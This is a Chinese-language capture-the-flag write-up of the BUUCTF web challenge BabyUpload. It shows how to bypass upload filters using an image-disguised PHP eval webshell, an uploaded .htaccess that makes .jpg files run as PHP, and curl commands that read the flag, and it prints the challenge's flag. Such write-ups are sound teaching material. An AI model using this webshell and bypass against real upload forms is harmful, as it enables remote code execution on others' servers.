---
title: "[GXYCTF2019]BabyUpload"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [file-upload, htaccess, bypass-filter, php-execution]
vulnerability: 文件上传过滤不严格，可通过 .htaccess 绕过后缀名检测执行 PHP 代码
solved: true
flag: "flag{691cc7fd-aa6d-4f62-8558-a0f61ef94a78}"
---

# [GXYCTF2019]BabyUpload

## 题目概述
题目是一个文件上传页面，允许用户上传文件。需要绕过各种过滤机制上传 webshell 获取 flag。

## 信息收集
1. 访问页面，发现是一个简单的文件上传表单
2. 测试上传 PHP 文件，发现过滤规则：
   - 后缀名不能包含 `ph`（阻止 .php, .phtml 等）
   - 文件内容不能包含 `<?php` 等 PHP 标签
   - 需要绕过文件类型检测

## 漏洞分析（漏洞类型、原理、判断过程）
1. **后缀名过滤绕过**：检测后缀名是否包含 `ph`，但未禁止 `.htaccess` 文件
2. **PHP 标签绕过**：使用 `<script language="php">` 替代 `<?php ?>` 标签
3. **文件类型绕过**：通过设置 `Content-Type: image/jpeg` 绕过类型检测
4. **`.htaccess` 利用**：上传 `.htaccess` 文件配置 `.jpg` 文件作为 PHP 执行

## 利用过程（Payload + Flag）

**Step 1: 上传包含 PHP 代码的 jpg 文件**
```bash
curl -s "http://target/" \
  -F "uploaded=@-;filename=shell.jpg;type=image/jpeg" \
  -F "submit=上传" <<< 'GIF89a<script language="php">eval($_POST[cmd]);</script>'
```
- 使用 `GIF89a` 图片头伪装
- 使用 `<script language="php">` 绕过 PHP 标签检测
- 设置 `type=image/jpeg` 绕过文件类型检测

**Step 2: 上传 .htaccess 配置文件**
```bash
curl -s "http://target/" \
  -F "uploaded=@-;filename=.htaccess;type=image/jpeg" \
  -F "submit=上传" <<< 'AddType application/x-httpd-php .jpg'
```
- 配置 Apache 将 `.jpg` 文件作为 PHP 执行

**Step 3: 执行命令获取 flag**
```bash
curl -s "http://target/upload/xxx/shell.jpg" -d "cmd=echo file_get_contents('/flag');"
# 输出: flag{691cc7fd-aa6d-4f62-8558-a0f61ef94a78}
```

## 复现步骤
1. 使用同一 session 上传 `shell.jpg`（含 PHP 代码）和 `.htaccess`（配置 jpg 执行为 PHP）
2. 访问上传的 `shell.jpg`，POST 参数 `cmd` 执行 PHP 代码
3. 使用 `file_get_contents('/flag')` 读取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 文件上传 | 上传功能 | `.htaccess` + `<script language="php">` | Apache 配置、PHP 标签变体 |
| 过滤绕过 | 后缀检测 | 使用 `.jpg` 后缀配合 `.htaccess` | 文件类型伪装 |
| 过滤绕过 | 内容检测 | `<script language="php">` 替代 `<?php` | PHP 解析特性 |

## 知识总结（解题技巧、同类题型套路）
1. **`.htaccess` 利用**：当允许上传 `.htaccess` 时，可配置任意后缀作为 PHP 执行
2. **PHP 标签变体**：`<script language="php">` 是 PHP 5.x 支持的另一种标签形式，可绕过 `<?` 检测
3. **文件类型绕过**：通过修改 `Content-Type` 或添加图片头（GIF89a）绕过检测
4. **Session 固定目录**：使用同一 session cookie 可使多个文件上传到同一目录
